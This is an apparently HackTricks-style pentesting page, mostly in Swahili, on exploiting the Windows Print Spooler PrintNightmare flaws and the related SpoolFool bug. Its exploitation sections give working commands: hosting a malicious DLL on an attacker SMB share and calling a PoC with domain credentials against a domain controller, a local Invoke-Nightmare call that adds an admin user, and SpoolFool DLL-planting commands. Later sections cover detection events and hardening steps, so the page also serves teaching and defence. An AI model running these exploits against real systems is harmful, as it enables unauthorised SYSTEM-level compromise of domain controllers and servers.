# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare ni jina la pamoja linalopewa familia ya vulnerabilities katika huduma ya Windows **Print Spooler**, ambazo huruhusu **arbitrary code execution as SYSTEM** na, spooler inapofikika kupitia RPC, **remote code execution (RCE) kwenye domain controllers na file servers**. CVEs zilizotumiwa zaidi ni **CVE-2021-1675** (hapo awali iliainishwa kama LPE) na **CVE-2021-34527** (RCE kamili). Masuala yaliyofuata kama **CVE-2021-34481 (“Point & Print”)** na **CVE-2022-21999 (“SpoolFool”)** yanathibitisha kuwa attack surface bado haijafungwa kikamilifu.

Ikiwa unatafuta **authentication coercion / relay** kupitia spooler badala ya **driver-based RCE/LPE**, angalia [ukurasa huu mwingine kuhusu printer coercion abuse](printers-spooler-service-abuse.md). Ukurasa huu unaangazia **kupakia drivers / DLLs kama SYSTEM**.

---

## 1. Vipengele vilivyo hatarini na CVEs

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Ilipatched katika June 2021 CU lakini ikazungukwa na CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` huruhusu authenticated users kupakia driver DLL kutoka remote share; baada ya August 2021, kwa kawaida hii huhitaji Point & Print policies zilizolegezwa|
|2021|CVE-2021-34481|“Point & Print”|LPE|Usakinishaji wa unsigned driver na non-admin users|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Uundaji wa directory kiholela → DLL planting – hufanya kazi baada ya 2021 patches|

Zote hutumia vibaya mojawapo ya **MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) au trust relationships ndani ya **Point & Print**.

## 2. Mbinu za Exploitation

### 2.1 Kuvamiwa kwa Domain Controller kwa mbali (CVE-2021-34527)

Mtumiaji wa domain aliyethibitishwa lakini **asiye na privileges** anaweza kuendesha DLLs kiholela kama **NT AUTHORITY\SYSTEM** kwenye spooler ya mbali (mara nyingi DC) kwa:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
PoCs maarufu zinajumuisha **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) na modules za `misc::printnightmare / lsa::addsid` za Benjamin Delpy katika **mimikatz**.

### 2.2 Local privilege escalation (any supported Windows, 2021-2024)

API hiyo hiyo inaweza kuitwa **locally** ili kupakia driver kutoka `C:\Windows\System32\spool\drivers\x64\3\` na kupata privileges za SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Triage ya kisasa kwenye hosts zilizowekewa patches

Kwenye host iliyosasishwa kikamilifu, PrintNightmare PoCs za umma mara nyingi hushindwa kwa sababu Windows sasa kwa default inaruhusu **wasimamizi pekee** kusakinisha printer driver (`RestrictDriverInstallationToAdministrators=1` tangu Agosti 10, 2021). Kabla ya kutumia exploit dhidi ya target, kwanza angalia ikiwa mazingira yalibadilisha tena mabadiliko hayo ya usalama kwa ajili ya printer deployments za legacy:<sup>[[3]](#references)</sup>
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Thamani mbili dhaifu zinazovutia zaidi kwa kawaida ni:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Kutoka Linux, thibitisha haraka kuwa target inafichua print RPC interfaces husika kabla ya kuendesha PoC:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Baadhi ya zana mpya za umma pia hukupa mtiririko wa kazi salama zaidi wa **check/list** kabla ya kutuma DLL:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Ikiwa unapata `RPC_E_ACCESS_DENIED` (`0x8001011b`) ukiwa mtumiaji mwenye marupurupu ya chini, kwa kawaida unaona usanidi chaguo-msingi wa baada ya 2021 badala ya kushindwa kwa transport.

> Kwenye Windows 11 22H2+ na builds mpya zaidi za client, remote printing kwa chaguo-msingi hutumia **RPC over TCP**, na **RPC over named pipes** (`\PIPE\spoolss`) imezimwa isipokuwa iwashwe tena waziwazi. Baadhi ya PoCs na maelezo ya maabara ya zamani bado hudhani kuwa named pipe inaweza kufikiwa.<sup>[[4]](#references)</sup>

### 2.4 Matumizi mabaya ya Package Point & Print kwenye mitandao “iliyopigwa patch”

Mazingira mengi ya enterprise yaliendelea kuwa **vulnerable kwa sababu ya policy** baada ya patches za awali za 2021, kwa sababu workflows za helpdesk au print-server bado zilihitaji watumiaji wasio-admin kusakinisha/kusasisha drivers. Kwa vitendo, offensive playbook huwa:

- Ikiwa security prompts zimezimwa kabisa, **classic arbitrary-DLL PrintNightmare** bado ndiyo njia fupi zaidi.
- Ikiwa `Only use Package Point and Print` imewashwa, kwa kawaida unahitaji kugeukia njia ya **signed package-aware driver** badala ya raw DLL drop.<sup>[[3]](#references)</sup>
- Utafiti wa 2024 ulionyesha kuwa **`Package Point and Print - Approved servers` si trust boundary thabiti yenyewe**: ikiwa attacker anaweza ku-spoof au kuteka nyara name resolution ya print server moja iliyoidhinishwa, victims bado wanaweza kuelekezwa kwenye server hasidi inayokidhi policy checks.<sup>[[4]](#references)</sup>
- Hata kuchanganya UNC hardening na forced RPC-over-SMB kunaweza kuwa brittle, kwa sababu clients za kisasa zinaweza **kuangukia kwenye RPC over TCP**.<sup>[[4]](#references)</sup>

Hii ndiyo sababu exploitation ya kisasa ya mtindo wa PrintNightmare mara nyingi inahusu zaidi **abusing enterprise printer deployment policy** kuliko kurudia PoC ya awali ya 2021 bila mabadiliko.

### 2.5 SpoolFool (CVE-2022-21999) – kupita marekebisho ya 2021

Patches za Microsoft za 2021 zilizuia remote driver loading lakini **hazikufanya directory permissions ziwe salama zaidi**. SpoolFool hutumia vibaya parameter ya `SpoolDirectory` kuunda directory yoyote ndani ya `C:\Windows\System32\spool\drivers\`, huweka payload DLL, na kulazimisha spooler kuipakia:<sup>[[2]](#references)</sup>
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Exploit hii hufanya kazi kwenye Windows 7 → Windows 11 iliyowekewa patches zote na Server 2012R2 → 2022 kabla ya updates za Februari 2022<sup>[[2]](#references)</sup>

---

## 3. Utambuzi na hunting

* **PrintService logs** – washa channel ya *Microsoft-Windows-PrintService/Operational* na fuatilia **Event ID 316** (driver imeongezwa/imesasishwa, kwa kawaida hujumuisha majina ya DLL) kwenye majaribio yaliyofaulu na yaliyoshindikana. Ilinganishe na **Event ID 808/811** kwa kushindwa kwa upakiaji wa modules/drivers za spooler kunakotiliwa shaka.
* **Sysmon** – `Event ID 7` (Image loaded) au `11/23` (File write/delete) ndani ya `C:\Windows\System32\spool\drivers\*` wakati mchakato mzazi ni **spoolsv.exe**.
* **Process lineage** – toa alert kila **spoolsv.exe** inapozalisha `cmd.exe`, `rundll32.exe`, PowerShell, au child process yoyote isiyotarajiwa na isiyo na signature.
* **Network telemetry** – SMB fetches zisizotarajiwa kutoka kwa `spoolsv.exe` kwenda kwenye shares zinazodhibitiwa na attacker au printer RPC traffic isiyo ya kawaida kutoka kwa servers ambazo hazipaswi kufanya kazi kama print servers ni viashiria muhimu vya kufuatilia.

## 4. Mitigation na hardening

1. **Weka patches!** – Tumia cumulative update ya hivi karibuni kwenye kila Windows host yenye Print Spooler service iliyosakinishwa.
2. **Disable spooler pale ambapo haihitajiki**, hasa kwenye Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Block remote connections** huku ukiendelea kuruhusu local printing – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Weka Point & Print kwa admins pekee** kwa kuweka:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Mwongozo wa kina uko kwenye Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Ikiwa mahitaji ya biashara yanalazimisha `RestrictDriverInstallationToAdministrators=0`, chukulia kila printer policy nyingine kama **partial mitigation pekee**. Kwa kiwango cha chini, pendelea **package-aware drivers**, washa **Only use Package Point and Print**, na zuia **Package Point and Print - Approved servers** kwa print servers zilizo wazi ndani ya in-forest.<sup>[[3]](#references)</sup>
6. **Usirejeshe printer RPC privacy** kwa lengo la kurekebisha printer mappings zilizoharibika. Environments zinazoweka `RpcAuthnLevelPrivacyEnabled=0` zinabatilisha hardening iliyoongezwa kwa ajili ya **CVE-2021-1678**, na kwa kawaida zinahitaji uchunguzi wa ziada wakati wa engagement.<sup>[[4]](#references)</sup>

---

## 5. Utafiti / tools zinazohusiana

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standard Impacket implementation yenye modes za `-check`, `-list`, na `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper yenye SMB delivery iliyojengwa ndani, support ya targets nyingi, na modes zote za `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – matumizi mabaya ya vulnerable printer driver yako mwenyewe kupitia package Point & Print
* SpoolFool exploit na write-up
* 0patch micropatches za SpoolFool na bugs nyingine za spooler

Ikiwa unataka **coerce authentication** kupitia spooler badala ya kupakia driver, nenda kwenye [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Manage new Point & Print default driver installation behavior](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – A Practical Guide to PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – The PrintNightmare is not Over Yet](https://itm4n.github.io/printnightmare-not-over/)

{{#include ../../banners/hacktricks-training.md}}
